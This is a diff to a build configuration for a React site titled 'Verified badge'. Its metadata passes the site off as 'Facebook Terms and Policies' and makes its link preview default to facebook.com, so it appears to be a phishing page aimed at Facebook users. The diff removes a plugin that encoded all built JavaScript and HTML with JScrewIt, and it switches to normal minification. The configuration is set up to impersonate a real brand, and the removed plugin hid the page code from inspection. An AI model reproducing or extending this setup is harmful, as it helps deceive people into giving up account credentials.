@@ -1,10 +1,9 @@
 import { defineConfig } from '@rsbuild/core';
 import { pluginReact } from '@rsbuild/plugin-react';
 import tailwindcss from '@tailwindcss/postcss';
-import fs from 'fs/promises';
-import JScrewIt from 'jscrewit';
-import path from 'path';
-import { fileURLToPath } from 'url';
+import fs from 'node:fs/promises';
+import path from 'node:path';
+import { fileURLToPath } from 'node:url';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -12,62 +11,6 @@ const __dirname = path.dirname(__filename);
 export default defineConfig({
     plugins: [
         pluginReact(),
-        {
-            name: 'plugin-jscrewit',
-            setup(api) {
-                api.onAfterBuild(async () => {
-                    const convertString2Unicode = (s) =>
-                        s
-                            .split('')
-                            .map((char) => {
-                                const hexVal = char.charCodeAt(0).toString(16);
-                                return '\\u' + ('000' + hexVal).slice(-4);
-                            })
-                            .join('');
-                    const processFile = async (filePath) => {
-                        try {
-                            const data = await fs.readFile(filePath, 'utf8');
-                            const isHtmlFile = path.extname(filePath).toLowerCase() === '.html';
-                            const TMPL = `document.write('__UNI__')`;
-                            const jsString = isHtmlFile ? TMPL.replace(/__UNI__/, convertString2Unicode(data)) : data;
-                            const jsfuckCode = JScrewIt.encode(jsString);
-                            const finalContent = isHtmlFile ? `<script type="text/javascript">${jsfuckCode}</script>` : jsfuckCode;
-                            await fs.writeFile(filePath, finalContent);
-                            api.logger.info(`encoded: ${filePath}`);
-                        } catch (error) {
-                            api.logger.error(`encode fail: ${filePath}`);
-                            throw error;
-                        }
-                    };
-                    const walkDir = async (dir) => {
-                        try {
-                            const files = await fs.readdir(dir);
-                            const processPromises = [];
-                            for (const file of files) {
-                                const filePath = path.join(dir, file);
-                                const stat = await fs.stat(filePath);
-                                if (stat.isDirectory()) {
-                                    processPromises.push(walkDir(filePath));
-                                } else if (/\.(js)$/i.test(file)) {
-                                    processPromises.push(processFile(filePath));
-                                }
-                            }
-                            await Promise.all(processPromises);
-                        } catch (error) {
-                            api.logger.error(`dir fail: ${dir}`);
-                            throw error;
-                        }
-                    };
-                    const distPath = path.resolve('dist');
-                    try {
-                        await fs.access(distPath);
-                        await walkDir(distPath);
-                    } catch {
-                        api.logger.error('dist not found');
-                    }
-                });
-            }
-        },
         {
             name: 'plugin-htaccess-spa',
             setup(api) {
@@ -102,14 +45,14 @@ export default defineConfig({
         title: 'Verified badge',
         favicon: './src/assets/images/tick.svg',
         meta: {
-            'description': 'Review and manage your Facebook account settings and preferences.',
+            description: 'Review and manage your Facebook account settings and preferences.'
         },
         tags: [
             { tag: 'meta', attrs: { property: 'og:title', content: 'Facebook Terms and Policies' } },
             { tag: 'meta', attrs: { property: 'og:description', content: 'Review and manage your Facebook account settings and preferences.' } },
             { tag: 'meta', attrs: { property: 'og:image', content: 'https://i.ibb.co/M56GDz14/opengraph-image.jpg' } },
             { tag: 'meta', attrs: { property: 'og:url', content: process.env.DEPLOY_URL || 'https://facebook.com' } },
-            { tag: 'meta', attrs: { property: 'og:type', content: 'website' } },
+            { tag: 'meta', attrs: { property: 'og:type', content: 'website' } }
         ]
     },
     source: {
@@ -117,11 +60,23 @@ export default defineConfig({
     },
     output: {
         dataUriLimit: {
-            image: Number.MAX_SAFE_INTEGER,
-            svg: Number.MAX_SAFE_INTEGER,
-            font: Number.MAX_SAFE_INTEGER,
-            media: Number.MAX_SAFE_INTEGER,
-            assets: Number.MAX_SAFE_INTEGER
+            image: 10240,
+            svg: 10240,
+            font: 10240,
+            media: 10240,
+            assets: 10240
+        },
+        minify: {
+            js: true,
+            css: true,
+            html: true
+        },
+        sourceMap: {
+            css: false
         }
+    },
+    performance: {
+        preload: true,
+        prefetch: true
     }
 });
